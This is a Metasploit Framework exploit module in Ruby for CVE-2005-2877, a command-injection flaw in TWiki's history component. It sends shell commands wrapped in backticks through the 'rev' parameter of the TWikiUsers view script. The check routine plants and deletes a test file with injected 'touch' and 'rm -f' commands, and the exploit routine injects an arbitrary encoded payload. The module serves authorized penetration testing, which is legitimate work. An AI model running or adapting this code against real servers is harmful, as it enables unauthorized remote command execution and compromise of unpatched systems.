##
# $Id: twiki_history.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TWiki History TWikiUsers rev Parameter Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability in the history component of TWiki.
				By passing a 'rev' parameter containing shell metacharacters to the TWikiUsers
				script, an attacker can execute arbitrary OS commands.
			},
			'Author'         =>
				[
					'B4dP4nd4',   # original discovery
					'jduck'       # metasploit version
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					[ 'CVE', '2005-2877' ],
					[ 'OSVDB', '19403' ],
					[ 'BID', '14834' ],
					[ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithRev' ]
				],
			'Privileged'     => true, # web server context
			'Payload'        =>
				{
					'DisableNops' => true,
					'BadChars'    => '',
					'Space'       => 1024,
				},
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Sep 14 2005',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [ true, "TWiki bin directory path", "/twiki/bin" ]),
			], self.class)
	end


	#
	# NOTE: This is not perfect, since it requires write access to the bin
	# directory. Unfortunately, detrmining the main directory isn't
	# trivial, or otherwise I would write there (required to be writable
	# per installation steps).
	#
	def check
		test_file = rand_text_alphanumeric(8+rand(8))
		cmd_base = datastore['URI'] + '/view/Main/TWikiUsers?rev='
		test_url = datastore['URI'] + '/' + test_file

		# first see if it already exists (it really shouldn't)
		res = send_request_raw({
				'uri' => test_url
			}, 25)
		if (not res) or (res.code != 404)
			print_error("WARNING: The test file exists already!")
			return Exploit::CheckCode::Safe
		end

		# try to create it
		print_status("Attempting to create #{test_url} ...")
		rev = rand_text_numeric(1+rand(5)) + ' `touch ' + test_file + '`#'
		res = send_request_raw({
				'uri' => cmd_base + Rex::Text.uri_encode(rev)
			}, 25)
		if (not res) or (res.code != 200)
			return Exploit::CheckCode::Safe
		end

		# try to run it, 500 code == successfully made it
		res = send_request_raw({
				'uri' => test_url
			}, 25)
		if (not res) or (res.code != 500)
			return Exploit::CheckCode::Safe
		end

		# delete the tmp file
		print_status("Attempting to delete #{test_url} ...")
		rev = rand_text_numeric(1+rand(5)) + ' `rm -f ' + test_file + '`#'
		res = send_request_raw({
				'uri' => cmd_base + Rex::Text.uri_encode(rev)
			}, 25)
		if (not res) or (res.code != 200)
			print_error("WARNING: unable to remove test file (#{test_file})")
		end

		return Exploit::CheckCode::Vulnerable
	end


	def exploit

		rev = rand_text_numeric(1+rand(5))
		rev << ' `' + payload.encoded + '`#'
		query_str = datastore['URI'] + '/view/Main/TWikiUsers'
		query_str << '?rev='
		query_str << Rex::Text.uri_encode(rev)

		res = send_request_cgi({
				'method'    => 'GET',
				'uri'	      => query_str,
			}, 25)

		if (res and res.code == 200)
			print_status("Successfully sent exploit request")
		else
			raise RuntimeError, "Error sending exploit request"
		end

		handler
	end

end